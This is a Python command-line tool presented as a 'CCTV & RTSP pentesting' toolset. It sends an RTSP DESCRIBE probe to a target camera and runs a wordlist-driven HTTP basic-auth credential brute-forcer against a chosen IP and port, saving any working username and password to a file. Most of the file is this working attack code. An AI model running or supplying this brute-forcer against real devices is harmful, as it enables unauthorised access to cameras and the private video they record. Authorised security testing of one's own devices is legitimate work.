import os
import platform
import subprocess
import sys
import time
import socket
from socket import AF_INET, SOCK_STREAM
from argparse import ArgumentParser, SUPPRESS


"""DEPENDENCY PRE INIT"""
def initialize_part_of_dependencies():
    try:
        from colorama import Fore, init
        init(autoreset=True)
    except ImportError:
        print("Colorama not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama"])
        from colorama import Fore, init
        init(autoreset=True)

DEPENDENCY_FLAG_FILE = ".dependencies_installed"
required_packages = [
    'termcolor',
    'colorama',
    'pyfiglet',
    'requests'
]

initialize_part_of_dependencies()

class CCTVToolset:

    def __init__(self):
        self.os_name = platform.system()
        self.s = socket.socket(AF_INET, SOCK_STREAM)
        self.install_missing_packages(required_packages)
        self.main()

    @staticmethod
    def banner():
        from pyfiglet import Figlet
        from termcolor import cprint
        from colorama import init
        init()
        f = Figlet(font='slant')
        print('\n')
        cprint(f.renderText('   C C T V'), 'magenta')
        cprint(f.renderText(' T o o l s e t'), 'blue')
        print('  ****************** Made by: BraiNiac ******************')
        print('\n')

    def main(self):
        from colorama import Fore

        parser = ArgumentParser(
            description='''-------- Swiss army knife for CCTV & RTSP Pentesting --------''',
            usage='python app.py --help',
            epilog='python app.py '
                   '--target-ip [IP] '
                   '--target-port [PORT] '
                   '--connection-test [Use provided SOCKET + Send HTTP request]',
            add_help=False
        )

        parser.add_argument_group('Required Arguments:')

        parser.add_argument(
            "-t", "--target-ip",
            type=str,
            metavar="<target>",
            help="Target IP of the device with that has the RTSP service enabled",
            required=False
        )
        parser.add_argument(
            "-p", "--target-port",
            type=str,
            metavar="<port>",
            help="Target PORT of the device with that has the RTSP service enabled",
            required=False
        )
        parser.add_argument(
            "-c", "--connection-test",
            action="store_true",
            help="Test the permission to connect to the device using an HTTP request "
                 "and the provided SOCKET",
            required=False
        )
        parser.add_argument(
            "-d", "--delay",
            type=str,
            metavar="<delay>",
            help="Set the delay time between requests (default is 2s)",
            required=False
        )
        parser.add_argument(
            "-u", "--user",
            type=str,
            metavar="<user>",
            help="Set a single username to brute force",
            required=False
        )
        parser.add_argument(
            "-ul", "--user-wordlist",
            type=str,
            metavar="<userlist>",
            help="Set the path to the wordlist file "
                 "for USERNAME field or SINGLE USERNAME",
            required=False
        )
        parser.add_argument(
            "-pl", "--password-wordlist",
            type=str,
            metavar="<password>",
            help="Set the path to the wordlist file "
                 "for PASSWORD field",
            required=False
        )
        parser.add_argument(
            "-o", "--out-file-path",
            type=str,
            metavar="<out>",
            help="Set the path to save the result as a file",
            required=False
        )
        parser.add_argument(
            "-fn", "--file-name",
            type=str,
            metavar="<file>",
            help="Set the name of the file that will be saved",
            required=False
        )
        parser.add_argument(
            "-h", "--help",
            action="help",
            default=SUPPRESS,
            help="Show this help message and exit"
        )

        if len(sys.argv) == 1:
            self.banner()
            parser.print_help()
            print("\n")
            sys.exit(0)

        args = parser.parse_args()

        if args.help:
            self.banner()
            print("\n")

        if not args.target_ip or not args.target_port:
            self.banner()
            parser.print_help()
            sys.exit(1)

        if args.target_ip and args.target_port and args.connection_test:
            self.banner()
            print("\n")
            self.rtsp_connect_test(args.target_ip, args.target_port)

        if (args.target_ip and args.target_port
                and args.password_wordlist and args.out_file_path
                and args.file_name):

            if args.user and args.user_wordlist:
                self.banner()
                print("\n")
                print(Fore.RED + "[-] ERROR: Use either --user or --user-wordlist, not both." + Fore.RESET)
                sys.exit(1)

            if not args.user and not args.user_wordlist:
                self.banner()
                print("\n")
                print(Fore.RED + "[-] ERROR: Either --user or --user-wordlist must be provided." + Fore.RESET)
                sys.exit(1)

            delay = args.delay if args.delay else "2"

            self.banner()
            print("\n")

            self.rtsp_brute(args.target_ip, args.target_port,
                            delay, args.user,
                            args.user_wordlist, args.password_wordlist,
                            args.out_file_path, args.file_name)
        else:
            self.banner()
            print("\n")

            print(Fore.RED + "[-] ERROR: Missing required arguments for brute-force." + Fore.RESET)
            sys.exit(1)

    def rtsp_connect_test(self, camera_ip, camera_port):
        """Test connection to the RTSP server."""
        from colorama import Fore, init

        init()
        describe_request = (
            f"DESCRIBE rtsp://{camera_ip}:{camera_port} RTSP/1.0\r\n"
            f"CSeq: 1\r\n"
            f"User-Agent: Chuck Testa\r\n"
            f"\r\n"
        )
        try:
            self.s.settimeout(5)
            print(Fore.YELLOW + "[*]" + Fore.RESET + f" Connecting to {camera_ip}:{camera_port}...")
            self.s.connect((camera_ip, int(camera_port)))
            print(Fore.YELLOW + "[*]" + Fore.RESET + " Sending DESCRIBE request...")
            self.s.sendall(describe_request.encode())

            print(Fore.YELLOW + "[*]" + Fore.RESET + " Waiting for response...")
            data = self.s.recv(4096)
            if data:
                print(Fore.YELLOW + "[!] " + Fore.RESET + "Response:\n")
                print(Fore.GREEN + data.decode('utf-8', errors='ignore') + Fore.RESET)
            else:
                print(Fore.RED + "[-]" + Fore.RESET + " No response received from the server.")
        except socket.timeout:
            print(Fore.RED + "[-]" + Fore.RESET + " Connection timed out. The server did not respond.")
        except ConnectionRefusedError:
            print(Fore.RED + "[-]" + Fore.RESET + " Connection refused. The server may be down or the port is closed.")
        except Exception as err:
            print(Fore.RED + "[-]" + Fore.RESET + f" An unexpected ERROR occurred: {err}")
        finally:
            self.s.close()

    @staticmethod
    def rtsp_brute(target_device_ip, target_device_port, set_delay, username,
                   user_wordlist, pass_wordlist, output_file_path, outputs_file_name):
        """Brute-force RTSP credentials."""
        from colorama import Fore, init
        import requests

        init()
        set_delay_converted = float(set_delay)
        exec_time = time.strftime("%Y/%m/%d %H:%M:%S")
        result_output_name_path = os.path.join(output_file_path, f"{outputs_file_name}({exec_time}).txt")

        try:
            if username:
                if not os.path.exists(pass_wordlist):
                    print(Fore.RED + f"[-] ERROR: Password wordlist file not found: {pass_wordlist}" + Fore.RESET)
                    return

                with open(pass_wordlist, "r") as pass_file:
                    for password in pass_file:
                        password = password.strip()
                        url = f"http://{target_device_ip}:{target_device_port}"
                        auth = (username, password)

                        print(
                            Fore.YELLOW + "[*]" + Fore.RESET + " Trying: "
                            + Fore.BLUE + "Username" + Fore.RESET + f": {username}, "
                            + Fore.MAGENTA + "Password" + Fore.RESET + f": {password}"
                        )

                        try:
                            response = requests.get(url, auth=auth, timeout=5)
                            if response.status_code == 200:
                                successfull_connection = (
                                        Fore.GREEN + "[+] " + Fore.RESET + "Success! "
                                        + Fore.BLUE + "Username" + Fore.RESET + f": {username}, "
                                        + Fore.MAGENTA + "Password" + Fore.RESET + f": {password}"
                                )
                                with open(result_output_name_path, "w") as result_file:
                                    result_file.write(successfull_connection)

                                print(successfull_connection)
                                print(f"File written at: {result_output_name_path}\n")
                                print("Operation terminated.")
                                return
                            else:
                                print(
                                    Fore.RED + "[-]" + Fore.RESET + " Failed: "
                                    + Fore.BLUE + "Username" + Fore.RESET + f": {username}, "
                                    + Fore.MAGENTA + "Password" + Fore.RESET + f": {password}"
                                )
                        except requests.RequestException as e:
                            print(
                                Fore.RED + "[-] " + Fore.RESET + "ERROR: "
                                + Fore.BLUE + "Username" + Fore.RESET + f": {username}, "
                                + Fore.BLUE + "Password" + Fore.RESET + f": {password}\n"
                                + Fore.RED + "[-] " + Fore.RESET + f"Error message: {e}"
                            )

                        time.sleep(set_delay_converted)

            elif user_wordlist:
                if not os.path.exists(user_wordlist):
                    print(Fore.RED + f"[-] ERROR: User wordlist file not found: {user_wordlist}" + Fore.RESET)
                    return
                if not os.path.exists(pass_wordlist):
                    print(Fore.RED + f"[-] ERROR: Password wordlist file not found: {pass_wordlist}" + Fore.RESET)
                    return

                with open(user_wordlist, "r") as user_file:
                    for user in user_file:
                        user = user.strip()
                        with open(pass_wordlist, "r") as pass_file:
                            for password in pass_file:
                                password = password.strip()
                                url = f"http://{target_device_ip}:{target_device_port}"
                                auth = (user, password)

                                print(
                                    Fore.YELLOW + "[*]" + Fore.RESET + " Trying: "
                                    + Fore.BLUE + "Username" + Fore.RESET + f": {user}, "
                                    + Fore.MAGENTA + "Password" + Fore.RESET + f": {password}"
                                )

                                try:
                                    response = requests.get(url, auth=auth, timeout=5)
                                    if response.status_code == 200:
                                        successfull_connection = (
                                                Fore.GREEN + "[+] " + Fore.RESET + "Success! "
                                                + Fore.BLUE + "Username" + Fore.RESET + f": {user}, "
                                                + Fore.MAGENTA + "Password" + Fore.RESET + f": {password}"
                                        )
                                        with open(result_output_name_path, "w") as result_file:
                                            result_file.write(successfull_connection)

                                        print(successfull_connection)
                                        print(f"File written at: {result_output_name_path}\n")
                                        print("Operation terminated.")
                                        return
                                    else:
                                        print(
                                            Fore.RED + "[-]" + Fore.RESET + " Failed: "
                                            + Fore.BLUE + "Username" + Fore.RESET + f": {user}, "
                                            + Fore.MAGENTA + "Password" + Fore.RESET + f": {password}"
                                        )
                                except requests.RequestException as e:
                                    print(
                                        Fore.RED + "[-] " + Fore.RESET + "ERROR: "
                                        + Fore.BLUE + "Username" + Fore.RESET + f": {user}, "
                                        + Fore.BLUE + "Password" + Fore.RESET + f": {password}\n"
                                        + Fore.RED + "[-] " + Fore.RESET + f"Error message: {e}"
                                    )

                                time.sleep(set_delay_converted)
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] User interrupted the script. Exiting gracefully..." + Fore.RESET)
            if os.path.exists(result_output_name_path):
                print(Fore.GREEN + f"[+] Successfully wrote results to: {result_output_name_path}" + Fore.RESET)
        except Exception as e:
            print(
                Fore.RED + "[-] " + Fore.RESET + "ERROR: "
                + Fore.BLUE + "Username" + Fore.RESET + f": {username or 'N/A'}, "
                + Fore.BLUE + "Password" + Fore.RESET + f": {password if 'password' in locals() else 'N/A'}\n"
                + Fore.RED + "[-] " + Fore.RESET + f"Error message: {e}"
            )

    @staticmethod
    def is_package_installed(package_name):
        try:
            import importlib.util
            spec = importlib.util.find_spec(package_name)
            return spec is not None
        except (ImportError, AttributeError):
            return False

    def install_missing_packages(self, packages):
        checkmark = '\u2713'
        missing_packages = [pkg for pkg in packages if not self.is_package_installed(pkg)]

        if missing_packages:
            try:
                print("\n")
                print("       ********** SETTING UP CCTV TOOLSET **********")
                print(f"\nInstalling missing packages: {', '.join(missing_packages)}\n\n")

                try:
                    subprocess.check_call([sys.executable, '-m', 'pip', '--version'])
                except (subprocess.CalledProcessError, FileNotFoundError):
                    print(f"\nError: pip is not installed or not found in your system! Please install it first.")
                    sys.exit(1)

                subprocess.check_call([sys.executable, '-m', 'pip', 'install', *missing_packages])

                from colorama import Fore
                print(f'\nInstallation finished. {Fore.GREEN}[{checkmark}]{Fore.RESET}')
                time.sleep(2)
                os.system('cls' if self.os_name == 'Windows' else 'clear')

                for pkg in missing_packages:
                    if not self.is_package_installed(pkg):
                        print(f"\n{Fore.RED}[!] Error: Package {pkg} failed to install. Please check your internet connection and try again manually with: 'pip install {pkg}'{Fore.RESET}")
                        sys.exit(1)

            except subprocess.CalledProcessError as e:
                print(f'\nAn exception occurred while installing packages: {e}')
                print(f"Installation of one or more packages failed. Check the error message above and try again manually.")
                sys.exit(1)
            except Exception as ex:
                print('\nAn exception occurred: \n', ex)
                sys.exit(1)
        else:
            from colorama import Fore
            print(f'\n             Requirements already installed. {Fore.GREEN}[{checkmark}]{Fore.RESET}')
            time.sleep(4)
            os.system('cls' if self.os_name == 'Windows' else 'clear')
            self.banner()
            print(f'\n             {Fore.GREEN}******{Fore.RESET} Now you are all set! {Fore.GREEN}******{Fore.RESET}')
            time.sleep(4)
            os.system('cls' if self.os_name == 'Windows' else 'clear')

if __name__ == '__main__':
    """MAIN RUNNER"""
    from colorama import Fore, init
    init()
    os.system('clear' if platform.system() != 'Windows' else 'cls')
    CCTVToolset()